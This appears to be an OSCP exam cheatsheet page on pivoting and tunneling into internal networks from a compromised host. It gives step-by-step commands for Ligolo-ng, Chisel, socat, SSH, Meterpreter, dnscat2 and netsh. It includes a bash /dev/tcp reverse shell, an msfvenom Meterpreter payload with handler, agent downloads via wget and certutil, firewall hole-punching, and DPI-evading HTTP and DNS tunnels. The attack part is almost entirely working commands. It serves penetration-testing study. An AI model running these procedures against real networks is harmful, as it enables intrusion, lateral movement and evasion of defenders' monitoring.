---
title: "Pivoting & Tunneling"
date: 2026-06-20
weight: 110
draft: false
tags: ["oscp", "cheatsheet"]
summary: "Per-tool procedures for moving from a compromised host into internal networks that Kali cannot reach."
---

Per-tool procedures for moving from a compromised host into internal networks that Kali cannot reach directly.

- Source: https://heretek.dev/oscp-cheatsheet/pivoting-and-tunneling/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP

## Decision Tree

```text
SSH available on pivot host?
  YES → sshuttle (easiest, VPN-like)
  NO ↓

Need full subnet access?
  YES → Ligolo-ng (TUN interface, no proxychains)
  NO ↓

Need one or two ports?
  YES → Chisel reverse port forward
  NO ↓

Need SOCKS proxy?
  YES → Chisel reverse SOCKS
```

## Ligolo-ng (best for OSCP AD pivots — ← preferred)

- Creates a TUN interface. Run tools directly, without proxychains.

```bash
# === ATTACKER SETUP ===
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601

# === TRANSFER AGENT TO PIVOT HOST ===
./agent -connect ATTACKER:11601 -ignore-cert      # Linux
agent.exe -connect ATTACKER:11601 -ignore-cert     # Windows

# === CONFIGURE TUNNEL (in ligolo proxy console) ===
» session                                # select session
» ifconfig                              # find internal subnet
» start                                 # activate tunnel

# On Kali (new terminal):
sudo ip route add 10.10.10.0/24 dev ligolo

# Now use tools DIRECTLY (no proxychains):
nmap -sT -Pn 10.10.10.0/24
evil-winrm -i 10.10.10.5 -u admin -p password
impacket-psexec 'DOMAIN/user:pass'@10.10.10.5

# Catch reverse shells from internal network:
» listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## Chisel (lightweight alternative)

### Reverse SOCKS proxy (most common)

```bash
# Attacker:
./chisel server -p 8080 --reverse

# Target:
.\chisel client $KALI:9001 R:socks

# Use:
proxychains -q nmap -sT -Pn <internal_ip>
```

### Single port forward

```bash
# Target:
./chisel client ATTACKER:8080 R:3389:INTERNAL_HOST:3389
```

### Multiple port forwards

```bash
# Target:
./chisel client ATTACKER:8080 R:3389:10.10.10.5:3389 R:5985:10.10.10.5:5985
```

## Socat port forwarding (no SSH needed)

- Socat is often installed by default on Linux targets. For simple port forwarding it is simpler than SSH.

```bash
# Forward port on pivot to internal target
# Syntax: socat TCP-LISTEN:<local_port>,fork TCP:<internal_target>:<target_port>

# Example: forward pivot:2345 → internal_db:5432
socat -ddd TCP-LISTEN:2345,fork TCP:$TARGET:5432
# From Kali: psql -h PIVOT_IP -p 2345

# Example: forward pivot:2222 → internal_ssh:22
socat TCP-LISTEN:2222,fork TCP:$TARGET:22
# From Kali: ssh user@PIVOT_IP -p 2222
```

- `-ddd` = verbose output (useful for debugging). `fork` = handle multiple connections.
- Socat runs in the foreground. To run it in the background use `&` or `nohup`.

## SSH tunneling (when SSH is available)

```bash
# LOCAL port forward (Kali:localport → through pivot → internal:targetport)
ssh -N -L 8080:INTERNAL_IP:80 user@PIVOT
# Now on Kali: curl http://127.0.0.1:8080 → reaches INTERNAL_IP:80

# LOCAL port forward ON the pivot itself (opens a port on pivot → deeper host)
# Run this ON the pivot host after SSH'ing in:
ssh -N -L 0.0.0.0:4455:DEEPER_HOST:445 user@DEEPER_HOST
# 0.0.0.0 makes it listen on all interfaces so Kali can reach it
# From Kali: smbclient //PIVOT_IP:4455/share

# DYNAMIC SOCKS proxy (forward all traffic through pivot)
ssh -N -D 1080 user@PIVOT
# proxychains config: socks5 127.0.0.1 1080
# proxychains -q nmap -sT -Pn INTERNAL_IP

# REMOTE port forward (pivot → Kali — use when you can't SSH TO pivot from Kali)
# Run FROM the pivot:
ssh -N -R 127.0.0.1:2345:INTERNAL_IP:5432 kali@KALI_IP
# Now on Kali: psql -h 127.0.0.1 -p 2345

# REMOTE DYNAMIC SOCKS (reverse SOCKS — pivot initiates connection back to Kali)
# On Kali first: ssh into pivot, then:
ssh -N -R 1080 user@PIVOT
# On Kali: proxychains config: socks5 127.0.0.1 1080
# This creates a SOCKS proxy on Kali that routes through the pivot

# sshuttle (VPN-like — easiest if SSH available)
sshuttle -r user@PIVOT 10.10.10.0/24 -x PIVOT_IP

# ProxyJump (SSH through a jump host in one command)
ssh -J user@PIVOT user@INTERNAL_IP
```

SSH tunneling flag cheatsheet:

```text
-L = Local forward    (Kali listens, traffic goes OUT through pivot)
-R = Remote forward   (Pivot sends traffic BACK to Kali)
-D = Dynamic SOCKS    (Kali gets a SOCKS proxy through pivot)
-N = No shell         (just the tunnel, no interactive session)
-f = Background       (run tunnel in background)
```

## Proxychains configuration

```text
# /etc/proxychains4.conf — use dynamic_chain
socks5 127.0.0.1 1080
```

- (Important) nmap through proxychains must use `-sT` (TCP connect scan) and `-Pn` (skip ping).

```bash
proxychains -q nmap -sT -Pn -p 21,22,80,445,3389,5985 <internal_ip>
```

## Double / nested pivot (Attacker → Pivot1 → Pivot2 → Target)

Ligolo-ng double pivot is the default choice (recommended ← preferred). Chisel is the fallback when Ligolo breaks.

Network layout:

```text
NETWORK LAYOUT:
  Kali (10.10.14.x)
    ↓ agent connects back to Kali:11601
  Pivot1 (10.10.14.x / 172.16.1.x)     ← first tunnel (tun: ligolo)
    ↓ agent connects to Pivot1:11602 (forwarded to Kali:11601)
  Pivot2 (172.16.1.x / 192.168.1.x)    ← second tunnel (tun: ligolo2)
    ↓
  Target (192.168.1.x)
```

### Step 1 — First pivot (same as a single pivot)

```bash
# On Kali: create TUN + start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On Pivot1: connect agent back to Kali
./agent -connect KALI_IP:11601 -ignore-cert

# In ligolo proxy console (on Kali):
» session                       # select Pivot1 session
» ifconfig                      # note Pivot1's internal IP (172.16.1.x)
» start                         # start tunnel on default 'ligolo' tun

# On Kali (new terminal): add route to first internal network
sudo ip route add $TARGET/24 dev ligolo

# VERIFY: you can now reach $TARGET/24 from Kali
nmap -sT -Pn -p 445 172.16.1.X
```

### Step 2 — Transfer the agent to Pivot2

```bash
# On Kali: serve the agent binary (Linux or Windows version)
python3 -m http.server 80

# From Pivot2 (through the tunnel — Kali can now reach it):
# Linux:
wget http://KALI_IP/agent -O /tmp/agent && chmod +x /tmp/agent
# Windows:
certutil -urlcache -f http://KALI_IP/agent.exe C:\temp\agent.exe

# If Pivot2 can't reach Kali directly, upload agent TO Pivot1 first,
# then transfer from Pivot1 → Pivot2 via SMB/SCP/HTTP
```

### Step 3 — Create a listener so Pivot2's agent can reach the Kali proxy

- (Important) Pivot2 cannot reach Kali directly (different network). Add a listener on Pivot1 that forwards to the Kali proxy.

```bash
# IMPORTANT: Pivot2 can't reach Kali directly (different network).
# So we add a listener on Pivot1 that forwards to Kali's proxy.

# In ligolo proxy console — select the PIVOT1 session first:
» session                       # pick Pivot1
» listener_add --addr 0.0.0.0:11602 --to 0.0.0.0:11601 --tcp
# This means: anything hitting Pivot1:11602 gets forwarded to Kali:11601
```

### Step 4 — Connect the Pivot2 agent and create the second tunnel

```bash
# On Pivot2: connect agent to Pivot1 (which forwards to Kali's proxy)
./agent -connect 172.16.1.PIVOT1:11602 -ignore-cert
# The agent connects to Pivot1:11602 → forwarded to Kali:11601 → proxy sees new session

# On Kali: create SECOND tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# In ligolo proxy console:
» session                       # you'll see TWO sessions now — pick the NEW one (Pivot2)
» ifconfig                      # note Pivot2's deeper internal IP (192.168.1.x)
» start --tun ligolo2           # start on the SECOND tun interface

# On Kali (new terminal): add route to second internal network
sudo ip route add 192.168.1.0/24 dev ligolo2

# VERIFY: you can now reach 192.168.1.0/24 from Kali
nmap -sT -Pn -p 445 192.168.1.X
```

Now Kali can reach both internal networks directly:

```bash
# First network (through ligolo tun):
nmap -sT -Pn $TARGET/24
# Second network (through ligolo2 tun):
nmap -sT -Pn 192.168.1.0/24
evil-winrm -i 192.168.1.5 -u admin -p password
```

### Catching a reverse shell beyond a double pivot

- A reverse shell from Target (192.168.1.x) can only reach Pivot2. You must chain a listener all the way to Kali.

```bash
# Step 1: In ligolo console — select the PIVOT2 session
» session                       # pick Pivot2
» listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# This means: Target connects to Pivot2:4444 → forwarded to Kali:4444

# Step 2: On Kali — start your listener
nc -lvnp 4444

# Step 3: On Target — reverse shell points to PIVOT2's IP on the shared network
bash -c 'bash -i >& /dev/tcp/192.168.1.PIVOT2/4444 0>&1'
# Flow: Target → Pivot2:4444 → listener_add → Kali:4444 → shell!
```

### Chisel double pivot (alternative — use when Ligolo breaks)

```bash
# Hop 1: Pivot1 → Kali
# On Kali:
chisel server -p 8080 --reverse
# On Pivot1:
./chisel client KALI_IP:8080 R:socks
# Now Kali has SOCKS on 127.0.0.1:1080 into $TARGET/24

# Hop 2: Pivot2 → Pivot1
# On Pivot1 — start a second chisel server:
./chisel server -p 9090 --reverse
# On Pivot2:
./chisel client 172.16.1.PIVOT1:9090 R:1081:socks
# Now Pivot1 has SOCKS on 127.0.0.1:1081 into 192.168.1.0/24
# But we need this on KALI — so forward port 1081 through hop 1:
# On Pivot1:
./chisel client KALI_IP:8080 R:1081:127.0.0.1:1081

# On Kali — chain both SOCKS in /etc/proxychains4.conf:
# dynamic_chain (NOT strict_chain — strict fails if one hop drops)
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# Use proxychains for all tools into the deep network:
proxychains -q nmap -sT -Pn -p 445,5985 192.168.1.0/24
proxychains -q evil-winrm -i 192.168.1.5 -u admin -p password
```

- ← Preferred: Ligolo-ng is the default. No proxychains, tools work natively, and it breaks less often. Use Chisel only when Ligolo fails.

## HTTP tunneling (when DPI blocks SSH/raw TCP)

- Use case: deep packet inspection (DPI) blocks everything except HTTP/HTTPS. Chisel wraps traffic in HTTP and encrypts it internally with SSH.

### Chisel HTTP tunnel (passes DPI)

```bash
# On Kali — start Chisel server
./chisel server -p 8080 --reverse

# On compromised host — connect back over HTTP
./chisel client KALI_IP:8080 R:socks

# Now use proxychains for internal network access
proxychains -q nmap -sT -Pn -p 445,5985 INTERNAL_IP
proxychains -q evil-winrm -i INTERNAL_IP -u user -p pass
```

- Why it passes DPI: Chisel encapsulates all traffic inside HTTP requests. To DPI it looks like ordinary HTTP traffic, and the inner SSH encryption prevents content inspection.

Single port forward (over HTTP):

```bash
# Forward specific internal port to Kali
./chisel client KALI_IP:8080 R:5985:INTERNAL_IP:5985
# Now on Kali: evil-winrm -i 127.0.0.1 -u user -p pass
```

## Meterpreter pivot (when you already have a Meterpreter session)

- An alternative to Ligolo/Chisel. Uses autoroute + SOCKS proxy.

```bash
# Step 1: Create staged Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o met.exe

# Step 2: Start handler
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run

# Step 3: Upload and execute met.exe on pivot host → session opens

# Step 4: Add route to internal network through the session
use multi/manage/autoroute
set session 1
run
# Autoroute discovers internal subnets and adds routes automatically

# Step 5: Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

Set `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`, then use proxychains:

```bash
proxychains -q nmap -sT -Pn -p 445,3389,5985 INTERNAL_SUBNET/24
proxychains -q evil-winrm -i INTERNAL_IP -u USER -p PASS
proxychains -q impacket-psexec 'DOMAIN/USER:PASS'@INTERNAL_IP
```

Single port forward (without SOCKS):

```text
meterpreter> portfwd add -l 4455 -p 445 -r INTERNAL_IP
# Now on Kali: smbclient //127.0.0.1:4455/share
```

## DNS tunneling (when only DNS traffic is allowed)

- Use case: the target can only make DNS queries (port 53). Very slow, but it works when everything else is blocked. Tool: dnscat2.

### Setup

```bash
# On Kali — start DNS server
sudo dnscat2-server <your_domain>
# Or without a domain (direct IP mode):
sudo dnscat2-server --dns host=0.0.0.0,port=53

# On target — connect via DNS
./dnscat --dns server=KALI_IP
# Windows: dnscat2-v0.07-client-win32.exe --dns server=KALI_IP
```

### Using a dnscat2 session

```text
dnscat2> windows              # list active sessions
dnscat2> window -i 1          # interact with session
command (client01)> shell     # spawn a shell
command (client01)> download C:\Users\admin\Desktop\proof.txt
```

### Port forwarding over a DNS tunnel

```text
command (client01)> listen 127.0.0.1:4444 INTERNAL_IP:445
# Now Kali can access INTERNAL_IP:445 via 127.0.0.1:4444
```

- DNS tunneling is extremely slow. Use it only as a last resort after HTTP tunneling has also failed.

## Windows port forwarding (without external tools)

- Use case: you cannot upload Ligolo/Chisel to the target.

### netsh (built into Windows)

```powershell
# Forward local port to internal target
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_IP

# Verify
netsh interface portproxy show all

# Remove when done
netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
```

- (Important) You almost always need a firewall rule too. If the Windows firewall blocks inbound traffic, portproxy alone is useless.

```powershell
# Poke a hole in the firewall for the forwarded port
netsh advfirewall firewall add rule name="port_fwd_4455" protocol=TCP dir=in localport=4455 action=allow

# CLEAN UP when done (don't leave holes open)
netsh advfirewall firewall delete rule name="port_fwd_4455"
```

- From Kali: `smbclient //PIVOT_IP:4455/share`

### ssh.exe (built into Windows 10 1803+ / Server 2019+)

```powershell
# Check if available
where ssh
# Typically at C:\Windows\System32\OpenSSH\ssh.exe

# Remote dynamic SOCKS (same syntax as Linux SSH)
ssh -N -R 9998 kali@KALI_IP
# Now on Kali: proxychains with socks5 127.0.0.1 9998

# Remote port forward
ssh -N -R 127.0.0.1:4455:INTERNAL_IP:445 kali@KALI_IP
```

- ssh.exe supports all OpenSSH features, including remote dynamic. Prefer it over plink when available.

### plink.exe (PuTTY CLI — fallback when ssh.exe is missing)

```powershell
# Remote port forward (target → Kali)
plink.exe -ssh -l kali -pw kalipass -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
```

- (Important) Plink does not support remote dynamic port forwarding (`-R socks`). For SOCKS use ssh.exe or Chisel.
- On Kali, plink.exe is at: `/usr/share/windows-resources/binaries/plink.exe`
